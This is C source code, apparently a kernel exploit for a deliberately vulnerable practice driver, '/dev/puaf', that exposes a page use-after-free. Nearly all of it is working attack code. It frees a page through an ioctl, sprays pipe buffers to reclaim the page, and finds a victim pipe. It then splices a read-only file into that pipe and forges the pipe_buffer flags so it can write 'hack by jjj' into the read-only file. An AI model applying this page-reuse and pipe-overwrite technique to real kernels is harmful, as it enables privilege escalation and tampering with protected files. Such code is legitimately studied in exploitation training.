#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <pthread.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>



#define DEVICE_NAME "/dev/puaf"
#define IOCTL_FREE_PAGE 0x1 // IOCTL 指令: 释放页

#define N_PIPE 0x1fe
#define N_PREPIPE 0x10
void dump(void *addr, size_t size) {
    uint64_t *ptr = (uint64_t *) addr;  // 转换为 uint64_t 指针，按 8 字节读取
    size_t i;

    for (i = 0; i < size / sizeof(uint64_t); i += 2) {
        // 每行打印两个 8 字节的内容
        printf("%p  ", ptr + i);  // 打印当前地址
        printf("%016lx  ", ptr[i]);  // 打印第一个 8 字节数据
        if (i + 1 < size / sizeof(uint64_t)) {
            printf("%016lx\n", ptr[i + 1]);  // 打印第二个 8 字节数据
        } else {
            printf("\n");  // 如果只有一个 8 字节数据，换行
        }
    }
}

int bind_to_core(int core_id) {
    cpu_set_t cpuset;

    // 清空 cpu_set_t
    CPU_ZERO(&cpuset);

    // 将指定的 core_id（0）添加到 CPU 集合中
    CPU_SET(core_id, &cpuset);

    // 获取当前进程的 PID
    pid_t pid = getpid();

    // 设置进程的 CPU 亲和性
    if (sched_setaffinity(pid, sizeof(cpu_set_t), &cpuset) == -1) {
        perror("sched_setaffinity failed");
        return -1;
    }

    return 0;
}


    int mpipe[N_PIPE][2];
    int ppipe[N_PREPIPE][2];
int fd;
char buffer[1024];

void clean_pipe(){
        for(int i=0;i<N_PIPE;i++){
        close(mpipe[i][1]);
        close(mpipe[i][0]);
    }
}
void flush_data(){
    ssize_t bytes_read = read(fd, buffer, sizeof(buffer));
    if (bytes_read < 0) {
        perror("Failed to read from device");
        close(fd);
        return -1;
    }
}

int main() {
    //bind_to_core(0);
    char buff[0x1000];
    memset(buff,'a',0x1000);
    // for(int i=0;i<N_PREPIPE;i++){
    //         if (pipe(ppipe[i])) {
    //             puts("[-] Alloc pipe failed\n");
    //             return -1;
    //         }
    //         write(ppipe[i][1], buff, 0x100);
    // }



    // 打开设备文件
    fd = open(DEVICE_NAME, O_RDWR);
    if (fd == -1) {
        perror("Failed to open device");
        return -1;
    }






    // 写入一些数据到设备
    const char *str = "Hello from user space!";
    ssize_t bytes_written = write(fd, str, strlen(str));
    if (bytes_written < 0) {
        perror("Failed to write to device");
        close(fd);
        return -1;
    }
    printf("Data written to device: %s\n", str);

    // 发送 IOCTL 命令释放物理页
    int ret = ioctl(fd, IOCTL_FREE_PAGE, 0);
    if (ret < 0) {
        perror("Failed to send IOCTL command");
        close(fd);
        return -1;
    }
    printf("Physical page freed.\n");






    for(int i=0;i<N_PIPE;i++){
            if (pipe(mpipe[i])) {
                puts("[-] Alloc pipe failed\n");
                //clean_pipe();
                return -1;
            }
        write(mpipe[i][1], buff, 0x100);
    }


    // 尝试从已释放的页面读取数据，这将触发 UAF 漏洞
    
    flush_data();
    dump(buffer,0x60);

    size_t *data=(size_t*)buffer;
    size_t anon_ops=data[2];
    if(data[1]==0000010000000000)
        puts("[+] found");

    int victim_pipe_id=-1;
    for(int i=0;i<N_PIPE;i++){
        read(mpipe[i][0], buff, 0xff);
        flush_data();
        if(data[1]!=0x0000010000000000){
            printf("found victim!\n");
            dump(buffer,0x60);
            victim_pipe_id=i;
            break;
        }
    }
    for(int i=0;i<N_PIPE;i++){
        if(i==victim_pipe_id)
            continue;
        close(mpipe[i][1]);
        close(mpipe[i][0]);
    }



    int ro_fd=open("./ro_test",O_RDONLY);
    if(ro_fd<0){
        perror("Error opening file");
        return -1;
    }


    loff_t offset = 1;
    ssize_t nbytes = splice(ro_fd, &offset, mpipe[victim_pipe_id][1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice failed");
        return -1;
    }

    puts("\nbefore read");
    flush_data();
    dump(buffer,0x60);

    memset(buff,0,0x1000);
    //read(mpipe[victim_pipe_id][0], buff, 0x1);
    puts("\nafter read");
    flush_data();
    dump(buffer,0x60);

    size_t wdata[10];


    
    for(int i=0;i<10;i++){
        wdata[i]=data[i];
    }

    // wdata[8]=0x0000000000000010;
    // wdata[0]=wdata[5]
    // wdata[0]=data[5];
    // wdata[1]=0x0000000100000001;
    // wdata[2]=data[7];
    // wdata[3]=0x10;
    // wdata[4]=0;
    // wdata[5]=0;
    // wdata[6]=0;
    // wdata[7]=0;
    // wdata[8]=0;
    // write(fd,wdata,sizeof(wdata));
    wdata[8]=0x0000000000000010;

    write(fd,wdata,sizeof(wdata));    

    puts("\n");
    flush_data();
    dump(buffer,0x60);

    char *evil_str="hack by jjj";
    write(mpipe[victim_pipe_id][1],evil_str,sizeof(evil_str));

    puts("\n");
    flush_data();
    dump(buffer,0x90);

    // 这部分可能会输出已经释放的页面中的数据（如果页面内容未被重用）
    //printf("Data read from device after free: %s\n", buffer);
    
    clean_pipe();
    // 关闭设备文件

    close(fd);

    return 0;
}
